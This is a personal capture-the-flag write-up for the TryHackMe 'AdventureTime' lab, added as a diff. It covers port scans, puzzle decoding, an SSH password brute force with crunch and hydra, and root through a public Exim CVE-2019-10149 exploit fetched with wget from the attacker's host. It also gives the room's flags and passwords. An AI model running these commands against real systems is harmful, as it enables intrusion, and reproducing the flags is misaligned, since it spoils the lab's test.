@@ -1,0 +1,370 @@
+---------------TRYHACKME ROOM ADVENTURETIME----------------
+Link:https://tryhackme.com/r/room/adventuretime
+
+
+Scan for open ports:
+-->nmao -A 10.10.166.231
+
+ports open
+	--21
+	--22
+	--80
+	--443
+	
+On port 21 nothing
+
+on port 80 nothing
+
+On port 443 a web server runing so gobuster and ffuf
+	--> ffuf -u https://10.10.166.231/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -k
+		-https://10.10.166.231/candybar/
+			KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4=== --> base 32
+			Palpnh rwtrz iwt HHA rtgixuxrpit udg rajth. --> rot [A-Z]+15
+			Always check the SSL certificate for clues.
+	domain : land-of-ooo.com
+	
+so gobuter or ffuf on it
+
+
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+Dir found: /yellowdog/ - 200
+Dir found: /yellowdog/bananastock/ - 200
+Dir found: /yellowdog/bananastock/princess/ - 200
+DirBuster Stopped
+
+when we arrived to /yellowdog/bananastock/, we have that to decrypt
+input: _/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__   it is into morse
+output : THE BANANAS ARE THE BEST!!!
+
+<!--
+    Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
+    Key = my cool password
+    IV = abcdefghijklmanopqrstuvwxyz
+    Mode = CBC
+    Input = hex
+    Output = raw
+    -->  the magic safe is accessibel at port 31337. the magic word is: ricardio
+   
+   
+  we will try to connect to given port
+   
+ nc land-of-ooo.com 31337
+Hello Princess Bubblegum. What is the magic word?
+ricardio
+The new username is: apple-guards
+
+As we have new username we will connect to ssh
+
+apple-guards:THE BANANAS ARE THE BEST!!!
+
+flag1 --> tryhackme{Th1s1sJustTh3St4rt}
+
+---obtaining second flag 
+
+-->apple-guards@at:~$ cat mbox
+		From marceline@at  Fri Sep 20 16:39:54 2019
+		Return-Path: <marceline@at>
+		X-Original-To: apple-guards@at
+		Delivered-To: apple-guards@at
+		Received: by at.localdomain (Postfix, from userid 1004)
+			id 6737B24261C; Fri, 20 Sep 2019 16:39:54 +0200 (CEST)
+		Subject: Need help???
+		To: <apple-guards@at>
+		X-Mailer: mail (GNU Mailutils 3.4)
+		Message-Id: <20190920143954.6737B24261C@at.localdomain>
+		Date: Fri, 20 Sep 2019 16:39:54 +0200 (CEST)
+		From: marceline@at
+
+		Hi there bananaheads!!!
+		I heard Princess B revoked your access to the system. Bummer!
+		But I'll help you guys out.....doesn't cost you a thing.....well almost nothing.
+
+		I hid a file for you guys. If you get the answer right, you'll get better access.
+		Good luck!!!!
+
+--> find / -user marceline -type f 2>/dev/null
+	/etc/fonts/helper
+
+
+-->apple-guards@at:~$ /etc/fonts/helper
+
+	======================================
+	      BananaHead Access Pass          
+	       created by Marceline           
+	======================================
+
+	Hi there bananaheads!!!
+	So you found my file?
+	But it won't help you if you can't answer this question correct.
+	What? I told you guys I would help and that it wouldn't cost you a thing....
+	Well I lied hahahaha
+
+	Ready for the question?
+
+	The key to solve this puzzle is gone
+	And you need the key to get this readable: Gpnhkse
+
+	Did you solve the puzzle? 
+
+
+	bananaheads!!! Only yes or no!!!
+	bye!!!
+
+
+------Decrypt "Gpnhkse" with key "gone" it in vigenere
+------output : Abadeer
+
+
+After getting that we come back to helper file and we answer yes to ythe first question and our result to the second one
+	Did you solve the puzzle? yes
+
+	What is the word I'm looking for? Abadeer
+
+	That's it!!!! You solved my puzzle
+	Don't tell princess B I helped you guys!!!
+	My password is 'My friend Finn'
+
+
+
+So we get password of micheline
+	micheline:My friend Finn
+	
+Bingo we are connected and we can catch the second flag
+	marceline@at:~$ cat flag2
+	flag2---------------------->tryhackme{N1c30n3Sp0rt}
+	
+	
+------------------Founding the third flag
+marceline@at:~$ cat I-got-a-secret.txt
+Hello Finn,
+
+I heard that you pulled a fast one over the banana guards.
+B was very upset hahahahaha.
+I also heard you guys are looking for BMO's resetcode.
+You guys broke him again with those silly games?
+
+You know I like you Finn, but I don't want to anger B too much.
+So I will help you a little bit...
+
+But you have to solve my little puzzle. Think you're up for it?
+Hahahahaha....I know you are.
+
+111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010
+
+so we'll try decrypting that from spoon
+
+output --> The magic word you are looking for is ApplePie
+
+i'll try with the port 31337 to see the answer.
+
+Bingooo it works ......
+	nc land-of-ooo.com 31337
+	Hello Princess Bubblegum. What is the magic word?
+	ApplePie
+	The password of peppermint-butler is: That Black Magic
+
+so we got a new username and password --> peppermint-butler:That Black Magic
+	peppermint-butler@at:~$ cat flag3
+	flag3---------->tryhackme{N0Bl4ckM4g1cH3r3}
+
+
+------------------Founding 4th flag------------
+we have a jpg file on peppermint-butler account so we will download it to see if we will found sth interresting in the image.
+
+python3 -m http.server 
+
+we try it but it have a password.
+so we will try finding files with permissions of the current user
+
+--> find / -user peppermint-butler -type f 2>/dev/null
+	peppermint-butler@at:~$ find / -user peppermint-butler -type f 2>/dev/null
+	/usr/share/xml/steg.txt
+	/etc/php/zip.txt
+
+We will open the first one /usr/share/xml/steg.txt
+	peppermint-butler@at:~$ cat /usr/share/xml/steg.txt
+	I need to keep my secrets safe.
+	There are people in this castle who can't be trusted.
+	Those banana guards are not the smartest of guards.
+	And that Marceline is a friend of princess Bubblegum,
+	but I don't trust her.
+
+	So I need to keep this safe.
+
+	The password of my secret file is 'ToKeepASecretSafe'
+	
+----extracting the file on it---------
+	steghide extract -sf butler-1.jpg 
+	Enter passphrase: 
+	wrote extracted data to "secrets.zip".
+
+We come back and try to unzip secret file but it have a password now we have to found the secret file password.
+
+	peppermint-butler@at:~$ cat /etc/php/zip.txt
+	I need to keep my secrets safe.
+	There are people in this castle who can't be trusted.
+	Those banana guards are not the smartest of guards.
+	And that Marceline is a friend of princess Bubblegum,
+	but I don't trust her.
+
+	So I need to keep this safe.
+
+	The password of my secret file is 'ThisIsReallySave'
+so we have password of the zip file we will unzip it and see.
+
+
+	-->cat secrets.txt 
+	[0200 hours][upper stairs]
+	I was looking for my arch nemesis Peace Master, 
+	but instead I saw that cowering little puppet from the Ice King.....gunter.
+	What was he up to, I don't know.
+	But I saw him sneaking in the secret lab of Princess Bubblegum.
+	To be able to see what he was doing I used my spell 'the evil eye' and saw him.
+	He was hacking the secret laptop with something small like a duck of rubber.
+	I had to look closely, but I think I saw him type in something.
+	It was unclear, but it was something like 'The Ice King s????'.
+	The last 4 letters where a blur.
+
+	Should I tell princess Bubblegum or see how this all plays out?
+	I don't know.......
+	
+	
+	We will use the crunch to create a password dictionary that can be used to perform Bruteforce. 
+	We used the @ wildcard to make the combination of all the possible passwords and moved them into a text file by the name of file.txt. 
+	
+	-->crunch 18 18 -t 'The Ice King s@@@@' > file.txt
+	-->hydra -l gunter -P file.txt ssh://10.10.215.197
+
+	gunter:The Ice King sucks
+	
+gunter@at:~$ cat flag4
+flag4------------>tryhackme{P1ngu1nsRul3!}
+
+
+--------------------Founding 5th flag-----------
+
+	gunter@at:~$ find / -perm -u=s -type f 2>/dev/null
+	/usr/sbin/pppd
+	/usr/sbin/exim4
+	
+	
+Now we will chech what is in the folder exim4
+	gunter@at:~$ cat /etc/exim4/update-exim4.conf.conf
+	# /etc/exim4/update-exim4.conf.conf
+	#
+	# Edit this file and /etc/mailname by hand and execute update-exim4.conf
+	# yourself or use 'dpkg-reconfigure exim4-config'
+	#
+	# Please note that this is _not_ a dpkg-conffile and that automatic changes
+	# to this file might happen. The code handling this will honor your local
+	# changes, so this is usually fine, but will break local schemes that mess
+	# around with multiple versions of the file.
+	#
+	# update-exim4.conf uses this file to determine variable values to generate
+	# exim configuration macros for the configuration file.
+	#
+	# Most settings found in here do have corresponding questions in the
+	# Debconf configuration, but not all of them.
+	#
+	# This is a Debian specific file
+
+	dc_eximconfig_configtype='local'
+	dc_other_hostnames='at'
+	dc_local_interfaces='127.0.0.1.60000'
+	dc_readhost=''
+	dc_relay_domains=''
+	dc_minimaldns='false'
+	dc_relay_nets=''
+	dc_smarthost=''
+	CFILEMODE='644'
+	dc_use_split_config='false'
+	dc_hide_mailname=''
+	dc_mailname_in_oh='true'
+	dc_localdelivery='mail_spool'
+	gunter@at:~$ 
+
+-->git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
+-->cd exim4
+-->nano wizard.py
+
+And update the port in the download script into 60000.
+-->python3 -m http.server
+
+On the target machine download it with the command
+-->wget http://10.2.9.70:8000/wizard.py
+
+-->python3 wizard.py
+
+Run it two times ans bingoooo
+	unter@at:/tmp$ python3 wizard.py 
+	220 at ESMTP Exim 4.90_1 Ubuntu Thu, 12 Sep 2024 12:20:07 +0200
+
+	250 at Hello localhost [127.0.0.1]
+
+	250 OK
+
+	250 Accepted
+
+	354 Enter message, ending with "." on a line by itself
+
+	b'250 OK id=1sogvn-0000gj-21\r\n'
+	root@at:/tmp# id
+	uid=0(root) gid=0(root) groups=0(root),1007(gunter),1012(gcc)
+	root@at:/tmp# 
+
+root@at:/home/bubblegum/Secrets# cat bmo.txt 
+
+
+
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░▄██████████████████████▄░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░█░▄██████████████████▄░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
+░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
+░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
+░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░█▌░█░▀██████████████████▀░█░▐█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░████████████░░░░░██░░█░░█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
+░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
+░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
+░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
+░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
+░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░▀██████████████████████▀░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
+
+Secret project number: 211243A
+Name opbject: BMO
+Rol object: Spy
+
+In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}
+
+
+-------
+
+Good job on getting this code!!!!
+You solved all the puzzles and tried harder to the max.
+If you liked this CTF, give a shout out to @n0w4n.
+
+
+
+
+
+
+
